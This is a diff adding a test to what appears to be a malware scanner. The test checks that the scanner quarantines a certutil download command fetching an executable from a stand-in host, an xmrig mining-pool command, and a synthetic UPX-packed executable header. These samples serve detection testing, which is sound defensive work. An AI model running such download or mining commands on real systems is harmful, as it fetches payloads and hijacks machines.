@@ -89,7 +89,64 @@ def test_tier3_signatures():
         gc.collect()
         shutil.rmtree(temp_dir, ignore_errors=True)
 
+def test_upx_and_advanced_signatures():
+    temp_dir = tempfile.mkdtemp()
+    try:
+        db_path = os.path.join(temp_dir, "test_rep.db")
+        scanner = SentinelScanner(db_path=db_path)
+
+        # Test LOLBins & C2 patterns
+        lolbin_certutil = b"cmd.exe /c certutil.exe -urlcache -split -f http://attacker.com/mal.exe out.exe"
+        v_cert = scanner.scan_bytes(lolbin_certutil)
+        assert v_cert.verdict == VERDICT_QUARANTINE
+        assert "CertutilDownload" in v_cert.reason
+
+        stratum_miner = b"xmrig.exe -o stratum+tcp://pool.supportxmr.com:3333 -u 48test -p x"
+        v_miner = scanner.scan_bytes(stratum_miner)
+        assert v_miner.verdict == VERDICT_QUARANTINE
+        assert "StratumPool" in v_miner.reason
+
+        # UPX PE construct:
+        pe_offset = 64
+        num_sections = 2
+        opt_hdr_size = 224
+        # DOS Header
+        data = bytearray(b"MZ" + b"\x00" * 58 + pe_offset.to_bytes(4, "little"))
+        # PE Signature
+        data += b"PE\x00\x00"
+        # COFF File Header (20 bytes)
+        data += b"\x4c\x01" # Machine (x86)
+        data += num_sections.to_bytes(2, "little")
+        data += b"\x00" * 12 # Timestamps, symbols
+        data += opt_hdr_size.to_bytes(2, "little")
+        data += b"\x02\x01" # Characteristics
+        # Optional Header
+        data += b"\x00" * opt_hdr_size
+        # Section 1: "UPX0\x00\x00\x00\x00" (40 bytes)
+        data += b"UPX0\x00\x00\x00\x00" + b"\x00" * 32
+        # Section 2: "UPX1\x00\x00\x00\x00" (40 bytes)
+        data += b"UPX1\x00\x00\x00\x00" + b"\x00" * 32
+        # Add high entropy bytes (H > 7.10)
+        data += os.urandom(65536)
+
+        v_upx = scanner.scan_bytes(bytes(data))
+        assert v_upx.verdict == VERDICT_QUARANTINE
+        assert "UPXPacked" in v_upx.reason
+        assert v_upx.tier == 2
+
+        # Summary check
+        summary = scanner.get_signatures_summary()
+        assert summary["tier3_signatures_count"] >= 10
+        assert "LOLBin.CertutilDownload" in summary["signatures"]
+
+        print("[+] test_upx_and_advanced_signatures: PASSED (UPX PE section detection & LOLBin rules verified)")
+    finally:
+        del scanner
+        gc.collect()
+        shutil.rmtree(temp_dir, ignore_errors=True)
+
 if __name__ == "__main__":
     test_tier1_cache()
     test_tier2_entropy_gate()
     test_tier3_signatures()
+    test_upx_and_advanced_signatures()
